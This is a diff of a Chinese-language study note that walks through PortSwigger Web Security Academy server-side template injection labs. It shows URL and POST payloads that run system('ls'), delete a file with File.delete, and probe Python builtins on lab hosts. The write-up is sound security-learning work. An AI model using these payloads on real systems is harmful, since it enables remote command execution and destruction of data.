@@ -27,13 +27,26 @@ https://portswigger.net/web-security/server-side-template-injection/exploiting/l
 測試一下，可以發現 message 可以被注入 <br>
 https://0a3a00f00382d99e807bad12007a00d0.web-security-academy.net/?message=%3C%=7*7%%3E <br>
 > 49
+
 之後就開找檔案 <br>
 https://0a3a00f00382d99e807bad12007a00d0.web-security-academy.net/?message=%3C%=%20system(%22ls%22)%20%%3E <br>
 > morale.txt true
+
 之後達成條件：刪除 morale.txt <br>
 https://0a3a00f00382d99e807bad12007a00d0.web-security-academy.net/?message=%3C%=%20File.delete("morale.txt")%20%%3E <br>
 > Lab success
 
+### Lab2
+https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context
+記得用 lab 需求的帳密登入，一開始沒看到戳超久QQ <br>
+進入後，可以發現 Preferred name 送出封包為 user.name()，看起來有 SSTI，於是就簡單測了一下
+```
+blog-post-author-display=7*7&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm
+```
+
+```
+blog-post-author-display=dir(__builtins__)&csrf=hQtKf7CiArqjjjwZVcj6BNQoOxPXPEfm
+```
 
 ### picoCTF SSTI1
 payload
